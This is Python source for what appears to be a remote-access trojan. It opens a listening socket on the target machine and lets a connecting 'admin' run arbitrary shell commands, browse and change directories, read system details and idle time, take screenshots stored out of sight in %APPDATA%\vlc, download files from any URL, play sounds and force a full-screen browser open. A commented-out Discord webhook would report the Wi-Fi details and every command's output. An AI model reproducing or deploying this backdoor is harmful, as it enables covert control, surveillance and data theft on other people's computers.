import socket, threading, subprocess, os, platform, pyautogui, random, requests, playsound
from discord_webhook import DiscordWebhook,DiscordEmbed
from datetime import datetime
from ctypes import Structure, windll, c_uint, sizeof, byref
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWebEngineWidgets import *
# HOST = socket.gethostbyname(socket.gethostname())
HOST = '192.168.0.103'
PORT = 5050
FORMAT = 'UTF-8'
clients = []
devices = []
attempt = 0 # for browsing
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()

def announce(message):
    try:
        pass
        # WEBHOOK=" discord webhook here "
        # webhook=DiscordWebhook(url=WEBHOOK)
        # embed=DiscordEmbed(title=f"{'='*15}  ms Server  {'='*15}", description=message)
        # webhook.add_embed(embed)    
        # webhook.execute()
    except: pass

try: m = subprocess.check_output('Netsh WLAN show interfaces', shell=True).decode(FORMAT)
except: pass
announce(f':pushpin:   Server started: {datetime.now().strftime("%D %H:%M:%S")}\n:desktop:   Host: {HOST}\n:satellite:   Wi-Fi Network\n\n\n{m}')

def handle(client, name):
    global clients, devices
    while True:  
        try:
            if name == 'admin':
                msg = client.recv(1024).decode(FORMAT).split(" ")
                if msg[0] == 'exit': raise IndexError
                elif msg[0] == 'ls': Smsg = str(os.listdir(os.getcwd()))
                elif msg[0] == '$':
                    command = msg[1:]
                    __cmd__ = ""
                    for cmd_ in command:__cmd__ += cmd_+" "
                    __cmd__=__cmd__[0:-1]
                    Smsg = subprocess.check_output(__cmd__, shell=True).decode(FORMAT)
                elif msg[0] == '#':
                    command = msg[1:]
                    __cmd__ = ""
                    for cmd_ in command:__cmd__ += cmd_+" "
                    __cmd__=__cmd__[0:-1]
                    subprocess.call(__cmd__, shell=True)
                    Smsg=" "
                elif msg[0] == 'cd':
                    Smsg=f"[+] Previous Working Directory:\t{os.getcwd()}"
                    if len(msg) > 1:
                        if msg[1] == '..':os.chdir('..')
                        elif msg[1][0] == '"':
                            dir=msg[1:]
                            directory=""
                            for d in dir:directory+=d+' '
                            directory=directory[1:-2]
                            os.chdir(directory)
                        else:
                            try:os.chdir(msg[1])
                            except:pass
                    else: msg[0] = 'pwd'
                    Smsg+=f"\n[+] Current Working Directory:\t{os.getcwd()}"
                elif msg[0] == 'pwd': Smsg = os.getcwd()
                elif msg[0] == 'idletime':
                    class LASTINPUTINFO(Structure):
                        _fields_=[('cbSize', c_uint),('dwTime', c_uint),]
                    def get_idle_duration():
                        lastInputInfo = LASTINPUTINFO()
                        lastInputInfo.cbSize = sizeof(lastInputInfo)
                        windll.user32.GetLastInputInfo(byref(lastInputInfo))
                        millis=windll.kernel32.GetTickCount()-lastInputInfo.dwTime
                        return millis/1000.0
                    idletime=get_idle_duration()
                    Smsg = f'Idletime: {idletime} seconds\n'
                elif msg[0] == 'uname':
                    syst3m = platform.uname()
                    Smsg=f"System: {syst3m.system}"+'\n'
                    Smsg+=f"Node Name: {syst3m.node}"+'\n'
                    Smsg+=f"Release: {syst3m.release}"+'\n'
                    Smsg+=f"Version: {syst3m.version}"+'\n'
                    Smsg+=f"Machine: {syst3m.machine}"+'\n'
                    Smsg+=f"Processor: {syst3m.processor}"
                elif msg[0] == 'src' or msg[0] == 'screenshot':
                    CWD = os.getcwd()
                    os.chdir(os.environ["appdata"])
                    try:
                        os.mkdir('vlc')
                        os.chdir('vlc')
                    except:
                        try: os.chdir('vlc')
                        except: pass
                    chars = "1234567890asdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
                    img_file_name='screenshot-'
                    for _ in range(20):img_file_name+=random.choice(chars)
                    pyautogui.screenshot(img_file_name+'.png')
                    Smsg=f"Screenshot saved as: {img_file_name} in {os.getcwd()}"
                    os.chdir(CWD)
                elif msg[0] == 'browse':
                    global attempt
                    if attempt == 0:
                        try:
                            def browse_(url):
                                try:
                                    class Browser():
                                        def __init__(self):
                                            super(Browser, self)
                                            self.window = QWidget()
                                            self.window.setWindowTitle(' ')  # no title
                                            self.layout = QVBoxLayout()
                                            self.browser = QWebEngineView()
                                            self.layout.addWidget(self.browser)
                                            self.browser.setUrl(QUrl(url))
                                            self.window.setLayout(self.layout)
                                            self.window.showFullScreen()
                                    browser_ = QApplication([])
                                    window = Browser()
                                    browser_.exec_()
                                except:
                                    Smsg = '!!!'
                            try:
                                browse_(msg[1])
                            except:
                                browse_('https://newsroom.unsw.edu.au/sites/default/files/thumbnails/image/6_neanderthal_reconst_3.jpg')
                            attempt +=1
                            Smsg = '[+] Browser openned\n' + '[-] Browser closed'
                        except: Smsg = '!!!'
                    else: Smsg = "[-] Failed to open a browser session"
                elif msg[0] == 'play':
                    CWD = os.getcwd()
                    os.chdir(os.environ["appdata"])
                    try:
                        os.mkdir('vlc')
                        os.chdir('vlc')
                    except:
                        try: os.chdir('vlc')
                        except: pass
                    try:
                        with open(msg[1], 'r') as file:fileExists=True
                    except: 
                        fileExists=False
                        Smsg='[-] File not found'
                    try:
                        if fileExists == True:
                            playsound.playsound(msg[1])
                            Smsg=f"Played: {msg[1]}"
                    except:
                        Smsg=f'[!] File corrupted'
                    os.chdir(CWD)
                elif msg[0] == 'dget':
                    def download_f(url,name):
                        try:
                            if name:pass
                            else:name=req.url[url.rdfind("/")+1:]
                            with requests.get(url) as req:
                                with open(name,'wb') as f:
                                    for chunk in req.iter_content(chunk_size=8192):
                                        if chunk:f.write(chunk)
                                # return name
                        except Exception as error_info: announce(":no_entry:\n"+str(error_info))
                    try:
                        download_f(msg[1],msg[2])
                        Smsg = '[+] Download successful\n'+f'[i] File downloaded from: {msg[1]}\n'+f'[*] File saved in: {os.getcwd()}'
                    except: pass
                else: Smsg = "[-] Command not found"
                client.send(Smsg.encode(FORMAT))
                announce(str(msg)+":\n\n\n"+Smsg)

        except Exception as f:
            print(f)
            announce(f':warning: Critical Error\n\n{f}')
            index = clients.index(client)
            clients.remove(clients[index])
            client.close()
            devices.remove(devices[index])
            announce(':no_entry: Admin left')
            break

def receive():
    while True:
        client, address = server.accept()
        dev_name = client.recv(1024).decode(FORMAT)

        global clients, devices
        clients.append(client)
        devices.append(dev_name)
        announce(":white_check_mark: Admin joined")

        handle_thread = threading.Thread(target=handle, args=(client,dev_name))
        handle_thread.start()

receive()
